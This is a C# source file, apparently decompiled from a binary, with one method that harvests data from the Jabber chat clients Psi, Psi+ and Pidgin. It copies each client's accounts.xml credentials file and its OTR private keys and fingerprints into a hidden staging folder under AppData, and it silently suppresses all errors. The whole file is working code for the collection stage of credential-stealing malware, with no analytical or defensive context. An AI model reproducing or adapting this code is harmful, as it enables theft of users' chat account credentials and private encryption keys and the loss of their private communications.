using System;
using System.IO;

namespace jaber
{
	// Token: 0x0200000A RID: 10
	internal class jabber
	{
		// Token: 0x06000011 RID: 17 RVA: 0x00002B34 File Offset: 0x00000D34
		public static void jab()
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Psi+\\profiles\\default\\";
				string path2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.purple\\";
				string path3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Psi\\profiles\\default\\";
				try
				{
					bool flag = Directory.Exists(path3);
					if (flag)
					{
						Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Jabber\\Psi");
						string[] files = Directory.GetFiles(path3);
						foreach (string text in files)
						{
							try
							{
								FileInfo fileInfo = new FileInfo(text);
								bool flag2 = fileInfo.Name == "accounts.xml";
								if (flag2)
								{
									File.Copy(text, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Jabber\\Psi\\accounts.xml");
								}
								bool flag3 = fileInfo.Name == "otr.keys";
								if (flag3)
								{
									File.Copy(text, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Jabber\\Psi\\otr.keys");
								}
								bool flag4 = fileInfo.Name == "otr.fingerprints";
								if (flag4)
								{
									File.Copy(text, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Jabber\\Psi\\otr.fingerpits");
								}
							}
							catch
							{
							}
						}
					}
				}
				catch
				{
				}
				bool flag5 = Directory.Exists(path);
				if (flag5)
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Jabber\\Psi+");
					string[] files2 = Directory.GetFiles(path);
					foreach (string text2 in files2)
					{
						try
						{
							FileInfo fileInfo2 = new FileInfo(text2);
							bool flag6 = fileInfo2.Name == "accounts.xml";
							if (flag6)
							{
								File.Copy(text2, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Jabber\\Psi+\\accounts.xml");
							}
							bool flag7 = fileInfo2.Name == "otr.keys";
							if (flag7)
							{
								File.Copy(text2, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Jabber\\Psi+\\otr.keys");
							}
							bool flag8 = fileInfo2.Name == "otr.fingerprints";
							if (flag8)
							{
								File.Copy(text2, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Jabber\\Psi+\\otr.fingerpits");
							}
						}
						catch
						{
						}
					}
				}
				bool flag9 = Directory.Exists(path2);
				if (flag9)
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Jabber\\Pidgin");
					string[] files3 = Directory.GetFiles(path2);
					foreach (string text3 in files3)
					{
						try
						{
							FileInfo fileInfo3 = new FileInfo(text3);
							bool flag10 = fileInfo3.Name == "accounts.xml";
							if (flag10)
							{
								File.Copy(text3, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Jabber\\Pidgin\\accounts.xml");
							}
							bool flag11 = fileInfo3.Name == "otr.keys";
							if (flag11)
							{
								File.Copy(text3, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Jabber\\Pidgin\\otr.keys");
							}
							bool flag12 = fileInfo3.Name == "otr.fingerprints";
							if (flag12)
							{
								File.Copy(text3, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Jabber\\Pidgin\\otr.fingerpits");
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
